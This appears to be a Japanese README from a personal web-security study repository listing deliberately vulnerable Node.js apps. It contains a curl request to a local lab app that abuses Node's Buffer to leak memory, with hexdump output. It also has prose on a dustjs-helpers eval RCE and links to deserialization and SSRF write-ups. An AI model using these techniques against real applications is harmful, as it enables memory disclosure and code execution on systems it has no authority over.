<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [脆弱なアプリ](#%E8%84%86%E5%BC%B1%E3%81%AA%E3%82%A2%E3%83%97%E3%83%AA)
  - [Buffer](#buffer)
  - [dustjs-helper](#dustjs-helper)
- [サンプルアプリ](#%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB%E3%82%A2%E3%83%97%E3%83%AA)
  - [progate](#progate)
- [フォルダ構成](#%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E6%A7%8B%E6%88%90)
- [メモ](#%E3%83%A1%E3%83%A2)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->
# 脆弱なアプリ
## Buffer
https://www.smrrd.de/nodejs-hacking-challenge-writeup.html   
の脆弱なアプリ。   
`./routes/index.js`の以下の部分が脆弱。`new Buffer("admin password")`の部分に`new Buffer(100)`となるようにJSONリクエストの内容を変更すれば、メモリが100バイト分返ってくる。   
以下は正常な場合の文字列を送信した挙動。   
![image](https://user-images.githubusercontent.com/56021519/101337517-1bb9c300-38bf-11eb-82ac-88e99a69edca.png)   
以下は文字列ではなく数値を送信した挙動。   
![image](https://user-images.githubusercontent.com/56021519/101337601-37bd6480-38bf-11eb-93f4-58d5fdcd7b23.png)   
curlでこれを何回か繰り返せばsessionの署名に使う暗号化キーが得られるらしいが、自分でやったときは何回やっても得られなかった…NodeJSのバージョンを落とさないとダメなのか？？   
```txt
root@kali:~/Documents/AWAE/nodejs# curl http://localhost:3000/login -X POST -H "Content-Type: application/json" --data "{\"password\": 100}" | hexdump -C
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   662  100   645  100    17   125k   3400 --:--:-- --:--:-- --:--:--  129k
00000000  7b 22 73 74 61 74 75 73  22 3a 22 65 72 72 6f 72  |{"status":"error|
00000010  22 2c 22 65 72 72 6f 72  22 3a 22 70 61 73 73 77  |","error":"passw|
00000020  6f 72 64 20 77 72 6f 6e  67 3a 20 5c 75 30 30 30  |ord wrong: \u000|
00000030  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000040  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000050  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000060  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000070  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000080  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000090  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
000000a0  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
000000b0  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
000000c0  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
000000d0  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
000000e0  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
000000f0  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000100  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000110  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000120  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000130  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000140  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000150  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000160  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000170  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000180  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000190  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
000001a0  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
000001b0  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
000001c0  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
000001d0  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
000001e0  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
000001f0  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000200  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000210  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000220  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000230  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000240  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000250  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000260  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000270  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000280  30 30 30 22 7d                                    |000"}|
00000285
```
## dustjs-helper
if helperのevalと不十分な入力検証でRCEできる脆弱なNode.jsモジュール。   
https://github.com/linkedin/dustjs   
https://github.com/linkedin/dustjs-helpers/blob/03cd65f51a/README.md   
よくわからんけどどうやら修正されてないっぽい。   
# サンプルアプリ
## progate
プロゲートの無料のアプリ。
# フォルダ構成
```txt
.
├── app.js				// expressサーバーの設定
├── bin
│   └── www				// サーバーの起動
├── package.json
├── public				// 静的ファイル置き場
│   ├── images
│   ├── javascripts
│   └── stylesheets
│       └── style.css
├── routes				// サーバー側のコントローラ
│   ├── index.js
│   └── users.js
└── views					// サーバー側で画面を作成する際のテンプレート
    ├── error.jade
    ├── index.jade
    └── layout.jade
```
# メモ
https://www.smrrd.de/nodejs-hacking-challenge.html   
にNodeJSのハッキングチャレンジ記事がある   
https://medium.com/bugbountywriteup/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501   
NodeJSのSSRFのWriteup？的なものがある   
https://medium.com/egghunter/node-1-vulnhub-walkthrough-5635aa56cc74   
NodeJSのapp.jsはデータベースのデータをコマンドとして実行しようとするので、データベースに任意のコマンドを書き込む。シェルをゲット後の話。   
https://mars-cheng.github.io/blog/2018/Vulnhub-Temple-of-Doom-1-Write-up/   
node-serialize remote code execution(CVE-2017-5941)らしい。よさそう。   
https://www.hackingarticles.in/moonraker1-vulnhub-walkthrough/   
Node.js deserialization exploit for RCE   
https://cybervaultsec.com/ceh/hackthebox-celestial/   
HackTheBoxのCelestical.NodeJSのデシリアライズっぽい。   
https://www.doyler.net/security-not-included/nodejs-code-injection   
NodeJSのコマンドインジェクションのWriteup   
